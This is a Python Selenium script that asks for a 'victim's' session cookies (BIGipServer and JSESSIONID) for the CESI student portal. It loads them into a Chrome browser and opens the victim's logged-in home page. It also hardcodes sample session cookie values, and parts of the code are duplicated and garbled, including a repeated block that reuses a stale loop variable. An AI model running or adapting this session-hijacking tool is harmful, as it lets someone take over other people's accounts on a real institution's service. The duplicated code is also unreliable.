from selenium import webdriver
from win10toast import ToastNotifier

toast = ToastNotifier()
from win10toast import ToastNotifier

toast = ToastNotifier()


ent_cookies = [
    {
        'domain': 'wayf.cesi.fr',
        'httpOnly': True,
        'name': 'BIGipServer~ADMIN~pool-WAYF-https',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': 'rd1o00000000000000000000ffff0a601a38o443'
    },
    {
        'domain': 'wayf.cesi.fr',
        'httpOnly': True,
        'name': 'JSESSIONID',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': 'D79FC9A63135FE00021A7540E5B0C029'
    },
    {
        'domain': '.wayf.cesi.fr',
        'expiry': 1738758386,
        'httpOnly': False,
        'name': '_pk_id.9.5fe9',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': 'e4b2552385498fe8.1704803186.'
    },
    {
        'domain': '.wayf.cesi.fr',
        'expiry': 1704804986,
        'httpOnly': False,
        'name': '_pk_ses.9.5fe9',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': '1'
    },
    {
        'domain': '.wayf.cesi.fr',
        'expiry': 1738758386,
        'httpOnly': False,
        'name': '_pk_id.9.5fe9',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': 'e4b2552385498fe8.1704803186.'
    },
    {
        'domain': '.wayf.cesi.fr',
        'expiry': 1704804986,
        'httpOnly': False,
        'name': '_pk_ses.9.5fe9',
        'path': '/',
        'sameSite': 'Lax',
        'secure': True,
        'value': '1'
    }
]

ent_url = "https://wayf.cesi.fr/login?service=https%3A%2F%2Fent.cesi.fr%2Fservlet%2Fcom.jsbsoft.jtf.core.SG%3FPROC%3DIDENTIFICATION_FRONT"
ent_accueil_url = "https://ent.cesi.fr/accueil-apprenant"


print("please enter victim's cookies : ")
toast.show_toast(
    "Please enter victim's cookies",
    duration = 2,
    threaded = True,
)


BIGipServer = input("BIGipServer~ADMIN~pool-WAYF-https > ").replace(' ', '')
JSESSIONID = input("JSESSIONID > ").replace(' ', '')



print("🚀 | Launching browser...")
driver = webdriver.Chrome()
print("✅ | Browser launched !\n")




print("🔁 | Setting cookies...")

driver.delete_all_cookies()
good = True

for cookie in ent_cookies:
    if cookie['name'] == 'BIGipServer~ADMIN~pool-WAYF-https':
        cookie['value'] = BIGipServer
    elif cookie['name'] == 'JSESSIONID':
        cookie['value'] = JSESSIONID
    else:
        continue
    
    try:
        driver.add_cookie(cookie)
        print(f"\t🆗 | Cookie {cookie['name']} set to {cookie['value']}")
    except Exception as e:
        print(f"\t❌ | Error while setting cookie {cookie['name']} : {e}")
        good = False
    

if good : print("✅ | Cookies set !\n\t", driver.get_cookies())
else :
    print("❌ | Error while setting cookies !")
    toast.show_toast(
        "❌ | Error while setting cookies !",
        "Please check your cookies and try again.",
        threaded = True,
    )

    try:
        driver.add_cookie(cookie)
        print(f"\t🆗 | Cookie {cookie['name']} set to {cookie['value']}")
    except Exception as e:
        print(f"\t❌ | Error while setting cookie {cookie['name']} : {e}")
        good = False
    

if good : print("✅ | Cookies set !\n\t", driver.get_cookies())
else :
    print("❌ | Error while setting cookies !")
    toast.show_toast(
        "❌ | Error while setting cookies !",
        "Please check your cookies and try again.",
        threaded = True,
    )


driver.get(ent_accueil_url)